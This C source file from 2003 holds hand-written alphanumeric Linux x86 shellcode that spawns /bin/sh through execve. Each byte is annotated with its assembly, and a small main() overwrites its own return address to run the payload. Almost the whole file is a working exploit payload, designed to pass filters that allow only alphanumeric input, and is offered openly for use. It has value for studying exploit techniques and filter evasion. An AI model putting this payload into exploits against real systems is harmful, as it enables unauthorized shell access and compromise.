/*
 *  execve ("/bin/sh"..) (linux little endian)
 *
 *  Copyright (c) 2003 Angelo Dell'Aera <buffer@users.sourceforge.net>
 *
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */


/* 
 * This is an  alphanumeric shellcode  completely written by hand. It was
 * developed  using  Fenris by Michael Zalewski  which helped me too much
 * during development. As you can see from comments below, this shellcode
 * works fine if __GNUC__ < 3. This is due to optimizations introduced by 
 * gcc with __GNUC__ 3.  At this moment it's not available  a version for 
 * such compilers but probably it will happen in the next future.
 *
 * Thanks : 
 * ALoR - he suggested to me the idea of 'pushing the unobtainable' 8)  
 *
 */


#include <ansidecl.h>

main()
{

#if GCC_VERSION < 3000 	

long *ret;
char shellcode[] = "h0000" 	 //     68 30 30 30 30          push   $0x30303030
 		   "X"		 //     58                      pop    %eax
 		   "50000" 	 //     35 30 30 30 30          xor    $0x30303030,%eax
 		   "H"		 //     48                      dec    %eax
 		   "5DODO" 	 //     35 4f 44 4f 44          xor    $0x444f444f,%eax
 		   "5v0v0" 	 //     35 30 76 30 76          xor    $0x76307630,%eax
		   "L"           //     4c                      dec    %esp
		   "L"           //     4c                      dec    %esp
		   "L"           //     4c                      dec    %esp
		   "L"           //     4c                      dec    %esp
		   "L"           //     4c                      dec    %esp
		   "L"           //     4c                      dec    %esp
		   "L"           //     4c                      dec    %esp
		   "L"           //     4c                      dec    %esp
		   "L"           //     4c                      dec    %esp
		   "L"           //     4c                      dec    %esp
		   "L"           //     4c                      dec    %esp
		   "P"	 	 //     50                      push   %eax
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
 		   "D"           //     44                      inc    %esp
 		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
 		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "D"           //     44                      inc    %esp
		   "hZZZZ"    	 //     68 5a 5a 5a 5a          push   $0x5a5a5a5a
		   "X"		 //     58                      pop    %eax
		   "5ZZZZ"       //     35 5a 5a 5a 5a          xor    $0x5a5a5a5a,%eax
		   "P"		 //     50                      push   %eax
		   "hn0sh"	 //     68 6e 30 73 68          push   $0x6873306e
		   "D"		 //     44                      inc    %esp
		   "Y"		 //     59                      pop    %ecx
 		   "I"		 //     49                      dec    %ecx
 		   "Q"		 //     51                      push   %ecx
 		   "L"		 //     4c                      dec    %esp
 		   "h00bi"	 //     68 30 30 62 69          push   $0x69623030
 		   "Y"		 //     59                      pop    %ecx
 		   "I"		 //     49                      dec    %ecx
 		   "Q"		 //     51                      push   %ecx
 		   "D"		 //     44                      inc    %esp
 		   "Y"		 //     59                      pop    %ecx
 		   "I"		 //     49                      dec    %ecx
 		   "Q" 		 //     51                      push   %ecx
 		   "L"		 //     4c                      dec    %esp
 		   "T"           //     54                      push   %esp
 		   "Z"		 //     5a                      pop    %edx
 		   "P"		 //     50                      push   %eax
 		   "R"		 //     52                      push   %edx
 		   "T"		 //     54                      push   %esp
 		   "Y" 		 //     59                      pop    %ecx
		   "hXPPP"	 //     68 58 50 50 50          push   $0x50505058
 		   "X"		 //     58                      pop    %eax
 		   "5SPPP"	 //     35 53 50 50 50          xor    $0x50505053,%eax
 		   "P"		 //     50                      push   %eax
 		   "h0000"	 //     68 30 30 30 30          push   $0x30303030
 		   "X"		 //     58                      pop    %eax
 		   "50000"	 //     35 30 30 30 30          xor    $0x30303030,%eax
 		   "Q"		 //     51                      push   %ecx
 		   "P"		 //     50                      push   %eax
 		   "R"		 //     52                      push   %edx
 		   "U"		 //     55                      push   %ebp
 		   "T"		 //     54                      push   %esp
 		   "V"		 //     56                      push   %esi
 		   "W"		 //     57                      push   %edi
 		   "a";		 //     61                      popa


    ret = (long *)&ret + 2;
   (*ret) = (long)shellcode;

#else
#  error "This shellcode doesn't work if compiled with gcc-3.x. "
#  error "Compile it with gcc with __GNUC__ < 3! Aborting compiling...."
#endif

}

